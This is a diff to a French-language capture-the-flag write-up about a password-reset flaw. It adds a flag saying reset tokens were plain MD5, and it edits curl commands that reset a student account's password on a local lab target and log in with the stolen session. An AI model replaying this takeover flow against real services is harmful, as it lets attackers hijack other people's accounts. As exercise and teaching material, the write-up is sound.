@@ -1,4 +1,6 @@
-# Rest password
+# Reset password
+
+flag: `FLAG{r3s3t_t0k3n_w4s_just_md5_lol}`
 
 ## Reproduire la faille:
 
@@ -67,7 +69,7 @@ curl -si -X POST "http://$target/reset-password/confirm" \
 # set var
 target='127.0.0.1:4942'
 target_email='jdoe@student.42.tech'
-wanted_password='Qwerty1!'
+wanted_password='qwerty'
 
 # reset password flow for jdoe (see forum post)
 curl -si -X POST "http://$host/reset-password/request" \
@@ -83,7 +85,7 @@ curl -si -X POST "http://$target/reset-password/confirm" \
   --data-urlencode "new_password=$wanted_password"
 
 # authenticate and store cookie
-cookie_file='cookies_jdoe.txt'
+cookies_file='cookies_jdoe.txt'
 
 curl -si -X POST "http://$target/login" \
   --data-urlencode "identity=$target_email" \
